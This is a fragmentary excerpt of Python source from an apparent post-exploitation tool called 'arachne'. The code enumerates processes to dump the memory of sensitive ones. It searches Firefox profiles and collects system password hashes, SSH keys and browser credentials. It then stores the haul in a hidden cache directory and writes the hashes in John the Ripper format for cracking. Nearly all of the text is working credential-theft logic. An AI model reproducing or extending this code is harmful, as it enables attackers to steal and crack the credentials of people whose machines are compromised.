        ...
        try:
            ...
            for proc in psutil.process_iter(["pid", "name", "cmdline"]):
                try:
                    ...
                    if any(
                        sp in proc_info["name"].lower() for sp in sensitive_processes
                    ):
                        memory_dumps.append(
                            {
                                "pid": proc_info["pid"],
        ...
        try:
            ...
            if os.path.exists(firefox_path):
                for profile_dir in os.listdir(firefox_path):
                    if profile_dir.endswith(".default") or profile_dir.endswith(
                        ".default-release"
                    ):
    ...
    def execute(self):
        ...
        try:
            ...
            summary = {
                ...
                "extracted_hashes": len(self.results["system_hashes"]["linux"])
                + len(self.results["system_hashes"]["windows"]),
                "ssh_keys_found": len(self.results["ssh_keys"]),
                "browser_credentials": sum(
                    len(c.get("profiles", [])) if isinstance(c, dict) else 0
                    for c in self.results["browser_credentials"]
                ),
                "memory_processes": len(self.results["memory_dumps"]),
            }

            # Save detailed results
            output_dir = os.path.expanduser("~/.cache/.arachne/hashes")
            os.makedirs(output_dir, exist_ok=True)

            output_file = os.path.join(
                output_dir,
                f"hashdump_{socket.gethostname()}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            )
            with open(output_file, "w") as f:
                json.dump(self.results, f, indent=2, default=str)

            # Also save hashes in John the Ripper format
            john_file = os.path.join(
                output_dir, f"hashes_john_{socket.gethostname()}.txt"
            )
            with open(john_file, "w") as f:
                for username, hash_val in self.results["system_hashes"][
                    "linux"
                ].items():
